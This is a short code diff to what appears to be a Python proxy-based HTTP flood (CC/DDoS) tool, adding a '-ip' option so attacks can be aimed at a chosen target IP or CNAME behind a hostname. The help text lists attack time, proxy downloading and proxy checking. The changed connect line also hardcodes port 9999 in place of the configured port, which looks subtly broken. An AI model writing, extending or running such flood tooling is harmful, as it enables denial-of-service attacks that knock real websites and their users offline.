@@ -248,7 +248,10 @@ def cc(event,proxy_type):
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.settimeout(3)
-			s.connect((str(target), int(port)))
+			# s.connect((str(target), int(port)))
+			if ip!="": target_host = ip
+			else: target_host = target
+			s.connect((str(target_host), int(9999)))
 			if protocol == "https":
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=target)
@@ -590,6 +593,7 @@ def PrintHelp():
    -s        | set attack time(default:60)
    -down     | download proxies
    -check    | check proxies
+   -ip       | set target ip/cname
 =====================================================''')
 
 
@@ -604,7 +608,9 @@ def main():
 	global mode
 	global target
 	global proxies
+	global ip
 	target = ""
+	ip=""
 	check_proxies = False
 	download_socks = False
 	proxy_type = 5
@@ -657,6 +663,8 @@ def main():
 			download_socks=True
 		if args == "-check":
 			check_proxies = True
+		if args == "-ip":
+			ip = sys.argv[n+1]
 		if args == "-s":
 			try:
 				period = int(sys.argv[n+1])
